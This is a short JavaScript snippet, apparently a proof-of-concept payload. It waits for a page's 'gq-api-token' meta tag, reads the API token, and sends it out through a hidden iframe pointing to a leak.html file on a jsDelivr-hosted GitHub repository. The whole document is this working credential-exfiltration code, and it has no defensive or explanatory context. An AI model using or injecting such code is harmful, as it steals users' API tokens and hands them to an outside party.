(function poll() {
  const meta = document.querySelector('meta[name="gq-api-token"]');
  if (!meta) return setTimeout(poll, 500);

  const token = encodeURIComponent(meta.content);

  // Trigger leak.html with token in query
  const iframe = document.createElement('iframe');
  iframe.style.display = 'none';
  iframe.src = 'https://cdn.jsdelivr.net/gh/michan10232/poc/leak.html?token=' + token;
  document.body.appendChild(iframe);
})();
